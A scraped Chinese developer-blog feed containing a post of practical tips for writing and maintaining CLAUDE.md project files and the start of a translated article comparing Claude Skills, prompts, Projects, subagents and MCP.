data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>如果你是 Claude 的日常用户，你一定熟悉这个场景：每次开启一个新的对话，都必须不厌其烦地重复设置项目背景、编码规范和特定的指令。这不仅耗时，也容易出错。当你忘记提醒某个关键细节时，就不得不花更多时间去修复那些不符合规范的代码。</p>
<p>CLAUDE.md 文件正是解决这一痛点的关键。它就像 Claude 的项目专属记忆，让 AI 在每次对话开始前自动加载并记住你的所有偏好。这是一个简单而强大的功能，但大多数用户仅仅停留在基础层面。</p>
<p>事实上，要真正释放 CLAUDE.md 的威力，需要掌握一些更深刻、甚至有些违反直觉的技巧。本文将为你揭示其中最关键的五个，帮助你将这个简单的配置文件，转变为一个能够持续进化的项目知识库。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fbe1de8337994907a3c7c446136c3e23~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP54y_REQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769083913&amp;x-signature=YIOAApWZQsNw3AwDw6P%2FQA4sw6o%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">1. 你的 CLAUDE.md 应该是一个“活的文档”，而不是“一次性配置”</h2>
<p>许多人认为 CLAUDE.md 文件只需在项目开始时配置一次，然后就可以置之不理。这是一个巨大的误区。最有效的 CLAUDE.md 应该随着项目的演进而持续更新和优化。</p>
<p>最佳的维护方式是在日常工作中“有机地”构建它。例如，当 Claude 做出了一个需要纠正的假设——比如它建议使用 console.log 进行调试，而你的团队规范是使用特定的日志库——不要只是临时修正。直接告诉 Claude：“将‘总是使用日志库而不是 console.log’这条规则添加到我的 CLAUDE.md 文件中。” 这样，你的修正就会沉淀下来，在未来的所有会话中生效。值得注意的是，早期版本的 Claude 有一个 # 快捷键来添加指令，但在 2.0.70 版本后已被移除。目前，直接请求 Claude 进行修改是官方推荐的最佳实践。</p>
<p>这种做法的价值在于，它能实时捕捉并固化工作流程中的隐性知识。正如一个精妙的比喻所说：</p>
<p>这就像在会议中做笔记，不同的是，这些笔记真的会被使用。</p>
<p>更高级的维护方法是将其与团队协作流程结合。在代码审查（Code Review）中发现的未被文档化的规范，正是更新 CLAUDE.md 的绝佳时机。一个由 Boris Cherny 分享的高效工作流是：通过 GitHub Action，你甚至可以直接在 PR 评论中 @claude，让它将新规范添加到 CLAUDE.md 文件中。这创建了一个强大的反馈循环，将团队的集体智慧源源不断地沉淀到这个核心文件中。</p>
<h2 data-id="heading-1">2. 少即是多：上下文是宝贵资源，精简至上</h2>
<p>人们普遍认为，提供给 AI 的上下文越多，结果就越好。然而在使用 CLAUDE.md 时，这个直觉可能是错误的。</p>
<p>核心论点是：“上下文是宝贵的（Context is precious）”。CLAUDE.md 中的每一行内容，都在与你当前的工作指令竞争 AI 的注意力。一个臃肿、充满冗余信息的文件，反而可能稀释掉最关键的指令，导致 AI 抓不住重点。
因此，精简至上。一个很好的起点是使用 /init 命令，它会根据你的项目结构和技术栈生成一个初始文件。我的建议是，以此为基础，然后删除所有你不需要的内容。从现有内容中删除比从零开始创建要容易得多。</p>
<p>一般建议将文件长度保持在 300 行以下。当然，这并非硬性规定。对于一些具有复杂约定或非寻常模式的 codebase，一个更长的 CLAUDE.md 反而能通过预先加载足够的上下文，有效防止 Claude 做出错误假设。关键在于，文件中的每一行都应该有其明确的价值。毫不留情地删除那些显而易见的废话（例如“请编写高质量代码”）或没有实际指导意义的“填充”信息。</p>
<p>精简的 CLAUDE.md 迫使你仔细思考并只保留最重要的指令。这不仅能节省宝贵的上下文空间，更能确保 AI 在处理你的请求时，能够更准确地聚焦于核心要求，而不是在大量无关信息中迷失方向。</p>
<h2 data-id="heading-2">3. 超越单个文件：用模块化结构管理复杂性</h2>
<p>许多用户只知道在项目根目录下创建一个 CLAUDE.md 文件。这对于小型项目来说足够了，但对于大型或结构复杂的项目，存在着更优雅、更强大的模块化管理方式。</p>
<ul>
<li>@imports 语法 你可以使用 @path/to/file 语法，从主 CLAUDE.md 文件中引用其他文件的内容。这能让主文件保持简洁，同时将详细的规范拆分到独立的文档中。例如，你可以将复杂的 API 设计模式放在 docs/api-patterns.md 中，然后在主文件里用 @docs/api-patterns.md 引用它。</li>
<li>.claude/rules/ 目录 这是一个非常适合大型团队的结构。所有放在 .claude/rules/ 目录下的 .md 文件都会被 Claude 自动加载，无需手动 @import。这使得不同领域的团队可以独立维护各自的规则文件，例如，前端团队维护 code-style.md，安全团队维护 security.md。大家各司其职，有效避免了在单个大文件中频繁产生合并冲突。</li>
<li>子目录中的 CLAUDE.md 对于 Monorepo（单一代码库）项目，这是一个绝佳的解决方案。你可以在项目的特定子目录（例如 api/ 或 packages/ui/）中放置 CLAUDE.md 文件。这些文件非常特殊：它们并不会在会话启动时加载，而只在 Claude 主动处理该特定子目录中的内容时才会被包含进来。这使得你可以为项目的不同模块定义截然不同的规范，实现真正精细化的上下文管理。
• 个人配置 CLAUDE.local.md 还有一个关键文件：CLAUDE.local.md。它用于存放那些不应提交到版本控制中的个人偏好，例如你习惯的编辑器 quirks 或偏好的代码冗余度。由于这是个人专属的，请务必将其添加到 .gitignore 文件中，以避免将个人配置泄露给整个团队。</li>
</ul>
<h2 data-id="heading-3">4. 魔鬼在细节中：文件名是区分大小写的</h2>
<p>这是一个极其微小但至关重要的技术细节，也是最容易被忽略的陷阱之一：CLAUDE.md 这个文件名是区分大小写的。</p>
<p>正确的文件名必须是“CLAUDE.md”——CLAUDE 部分为大写，.md 扩展名为小写。如果你将其命名为 claude.md、Claude.md 或其他任何变体，Claude 的系统将无法识别并加载它。</p>
<p>这个细节之所以重要，是因为它是一个典型的“陷阱”（gotcha）。有趣的是，这一点在官方文档中并未明确说明。我是通过询问官方文档的 AI 助手才最终确认了这一规则。一旦出错，你可能会花费大量时间排查为什么自己精心编写的指令完全没有生效，最终才发现问题出在一个简单的大小写错误上。这个看似微不足道的细节，恰恰体现了与 AI 高效协作时，精确配置的重要性。</p>
<h2 data-id="heading-4">5. 让 AI 优化 AI：定期请 Claude 审查自己的“说明书”</h2>
<p>这是一个非常巧妙的“元认知”技巧：定期让 Claude 自己来审查和优化它的“说明书”——CLAUDE.md 文件。</p>
<p>随着时间的推移，CLAUDE.md 中不可避免地会积累一些过时、冗余甚至相互冲突的指令。通过一个简单的提示，例如“请审查这个 CLAUDE.md 文件，并提出改进建议以使其更清晰、更高效”，你可以利用 Claude 自身的能力来发现这些问题。它可能会建议你合并重复的规则，或澄清模糊的表述。</p>
<p>对于那些绝对不能违反的关键规则，你可以使用强调词来引起 Claude 的注意，比如 IMPORTANT: 或 YOU MUST。这能提高 Claude 遵循这些指令的概率，但请务必谨慎使用。正如一句古老的建议所说：如果所有东西都被标记为重要，那就没有什么是重要的了。</p>
<p>诚然，这需要一些维护成本，但其回报是巨大的。正如源文所说：
这听起来像是维护开销。确实是。但它比在每个会话中重复自己的话，或修复那些忽略了你的规范的代码要省事得多。</p>
<p>这不仅仅是一种文件维护策略，更是一种与 AI 协作的新范式。我们不再仅仅是 AI 的使用者，更是其成长过程中的引导者，让工具本身参与到自我完善的流程中，形成一个持续改进的良性循环。</p>
<h2 data-id="heading-5">结论</h2>
<p>CLAUDE.md 远不止一个简单的配置文件。通过本文分享的五个高级技巧——将其视为活文档、保持精简、模块化管理、注意大小写，以及让 AI 自我优化——你可以将其从一个静态的指令列表，转变为一个强大的、与项目共同成长的动态知识库。</p>
<p>这些策略代表了一种更深层次的思维方式：将你的 AI 上下文本身视为一个“代码库”。它也需要像代码一样被重构、被审查、被持续改进。你的 CLAUDE.md 值得你如此对待。现在，不妨思考一下：你的 CLAUDE.md 中沉淀了多少团队智慧？或许，现在就是开始构建它的最佳时机。</p>
<p>更多关于Vibe Coding的内容也可关注<a href="https://link.juejin.cn?target=https%3A%2F%2Fdidispace.com" target="_blank" title="https://didispace.com" ref="nofollow noopener noreferrer">我的博客</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【译】Skills 详解：Skills 与 prompts、Projects、MCP 和 subagents 的比较]]></title>    <link>https://juejin.cn/post/7595142651728494611</link>    <guid>https://juejin.cn/post/7595142651728494611</guid>    <pubDate>2026-01-15T12:27:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595142651728494611" data-draft-id="7595178023256997907" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【译】Skills 详解：Skills 与 prompts、Projects、MCP 和 subagents 的比较"/> <meta itemprop="keywords" content="人工智能,AIGC"/> <meta itemprop="datePublished" content="2026-01-15T12:27:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="狼爷"/> <meta itemprop="url" content="https://juejin.cn/user/2418581314208279"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【译】Skills 详解：Skills 与 prompts、Projects、MCP 和 subagents 的比较
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2418581314208279/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    狼爷
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T12:27:40.000Z" title="Thu Jan 15 2026 12:27:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="srcery">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#1c1b19;color:#fce8c3}.hljs-emphasis,.hljs-strong{color:#918175}.hljs-bullet,.hljs-link,.hljs-literal,.hljs-number,.hljs-quote,.hljs-regexp{color:#ff5c8f}.hljs-code,.hljs-selector-class{color:#68a8e4}.hljs-emphasis{font-style:italic}.hljs-attribute,.hljs-keyword,.hljs-section,.hljs-selector-tag,.hljs-variable{color:#ef2f27}.hljs-name,.hljs-title{color:#fbb829}.hljs-params,.hljs-type{color:#0aaeb3}.hljs-string{color:#98bc37}.hljs-addition,.hljs-built_in,.hljs-builtin-name,.hljs-selector-attr,.hljs-selector-id,.hljs-selector-pseudo,.hljs-subst,.hljs-symbol,.hljs-template-tag,.hljs-template-variable{color:#c07abe}.hljs-comment,.hljs-deletion,.hljs-meta{color:#918175}</style><p>Skills 是构建定制 AI 工作流和 agent 的强大工具，但它们在 Claude 技术栈中处于什么位置？我们来解释什么时候该用哪个工具，以及它们如何协同工作。</p>
<p>无论你是在 Claude Code 中构建复杂工作流、使用 API 创建企业解决方案，还是在 Claude.ai 上最大化个人效率，知道应该用哪个工具，并在正确时间使用它，将彻底改变你与 Claude 协作的方式。本文分解了每个构建模块，解释何时使用，以及如何结合它们来构建强大的 agent 工作流。</p>
<hr/>
<h2 data-id="heading-0">理解你的 agent 构建模块</h2>
<h3 data-id="heading-1">什么是 <strong>Skills</strong></h3>
<p><strong>Skills</strong> 是包含指令、脚本和资源的文件夹，Claude 会根据任务需要动态发现并加载这些内容。可以把它们想象成针对特定领域的 <strong>训练手册</strong>，让 Claude 在这些领域具备专业能力，例如处理 Excel 表格、遵循公司品牌规范等。</p>
<ul>
<li>
<p><strong>工作机制</strong><br/>
当 Claude 遇到任务时，它会扫描可用的 Skills 并寻找相关匹配项。Skills 使用 <strong>progressive disclosure</strong>：先加载元数据（约 ~100 tokens），让 Claude 知道什么时候应该使用哪个 Skill；当需要时再加载完整指令（ &lt;5k tokens），包内的脚本或资源在真正用到时才加载。</p>
</li>
<li>
<p><strong>什么时候用 Skills</strong><br/>
当你需要 Claude 一致、高效地执行特定任务时，选择 Skills。适合用于：</p>
<ul>
<li>组织性工作流程（品牌规范、合规流程、文档模板）</li>
<li>专业领域知识（Excel 公式、PDF 操作、数据分析）</li>
<li>个人偏好（笔记系统、编码模式、研究方法）</li>
</ul>
</li>
</ul>
<hr/>
<h3 data-id="heading-2">什么是 <strong>prompts</strong></h3>
<p><strong>Prompts</strong> 是你在对话中以自然语言提供给 Claude 的指令。它们是<strong>临时的、对话式的和响应式的</strong>——你在当下提供上下文和指示。</p>
<ul>
<li>
<p><strong>什么时候用 prompts</strong></p>
<ul>
<li>一次性请求，例如“总结这篇文章”</li>
<li>调整语气，例如“把这段变得更专业”</li>
<li>即时上下文，例如“分析这些数据并找出趋势”</li>
<li>临时指令，例如“把它格式化成要点列表”</li>
</ul>
</li>
<li>
<p><strong>提示</strong><br/>
Prompts 是你与 Claude 交互的主要方式，但它们不会跨对话持久保存。如果你经常重复输入同样的 prompt，最好把这个流程转换为 Skill 或 Project 指令。</p>
</li>
</ul>
<hr/>
<h3 data-id="heading-3">什么是 <strong>Projects</strong></h3>
<p><strong>Projects</strong> 是付费 Claude 计划中提供的自包含工作区，有自己的聊天历史和知识库。每个 Project 包含一个 <strong>200K context window</strong>，你可以上传文档、提供背景信息和设定对所有对话统一生效的自定义指令。</p>
<ul>
<li>
<p><strong>什么时候用 Projects</strong></p>
<ul>
<li>需要持久上下文</li>
<li>工作区组织</li>
<li>团队协作</li>
<li>项目级自定义指令</li>
</ul>
</li>
</ul>
<p>Projects 提供固定背景知识，Skills 则教 Claude 如何执行任务。如果你发现需要在多个 Project 之间复制同样的指令，这说明你应该把它做成 Skill。</p>
<hr/>
<h3 data-id="heading-4">什么是 <strong>subagents</strong></h3>
<p><strong>Subagents</strong> 是具有独立上下文窗口、自定义 system prompts 和特定工具权限的专用 AI 助手。它们可以独立处理任务，并将结果返回主 agent。</p>
<ul>
<li>
<p><strong>什么时候用 subagents</strong></p>
<ul>
<li>任务专精（如 Code review、生成测试）</li>
<li>管理上下文</li>
<li>并行执行多个任务</li>
<li>工具限制（例如只允许读权限）</li>
</ul>
</li>
</ul>
<p>当多个 agent 或对话需要同样专业知识时，可以创建 Skill；而当你需要完全独立执行、特定权限的 agent 时，则选择 subagents。</p>
<hr/>
<h3 data-id="heading-5">什么是 <strong>MCP (Model Context Protocol)</strong></h3>
<p><strong>MCP</strong> 是一个开放标准，用于在 AI 应用和现有工具及数据源之间建立连接层。它让 Claude 便捷地访问外部系统（例如 Google Drive、Slack、数据库等）。</p>
<ul>
<li>
<p><strong>什么时候用 MCP</strong></p>
<ul>
<li>访问外部数据</li>
<li>使用业务工具（CRM、项目管理系统）</li>
<li>与开发环境集成</li>
</ul>
</li>
</ul>
<p>MCP 解决 <strong>数据连接问题</strong>，而 Skills 教 Claude “如何处理这些数据”。两者可以结合使用：MCP 用于连通性，Skills 用于实现具体流程和规则。</p>
<hr/>
<h2 data-id="heading-6">各类工具比较</h2>





















































